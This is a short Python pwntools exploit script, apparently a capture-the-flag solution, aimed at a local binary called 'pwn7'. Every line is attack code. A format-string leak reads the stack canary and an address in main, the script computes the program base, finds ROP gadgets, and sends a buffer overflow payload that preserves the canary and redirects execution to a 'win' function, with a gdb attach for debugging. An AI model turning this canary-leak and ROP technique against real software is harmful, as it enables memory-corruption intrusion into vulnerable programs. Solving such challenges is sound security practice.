from pwn import *


binary = "./pwn7"

e = ELF(binary)

r = process(binary)

r.recv()

r.sendline("%13$lx : %19$lx")
leak = r.recv().decode().split(" : ")
canary = int(leak[0], 16)
leaked_main_addr = int(leak[1], 16)
print(hex(canary), hex(leaked_main_addr))
e.address = leaked_main_addr - e.symbols['main']
er = ROP(binary)
pop_rdi_gadget = e.address + er.find_gadget(["pop rdi"])[0]
ret_gadget = e.address + er.find_gadget(["ret"])[0]

payload = flat("A" * 24, p64(canary),"A"*8, p64(pop_rdi_gadget), p64(0xdeadbeef), p64(ret_gadget), p64(e.symbols['win']) )
gdb.attach(r,"""
b *vuln +96
c""")
r.sendline(payload)
r.interactive()
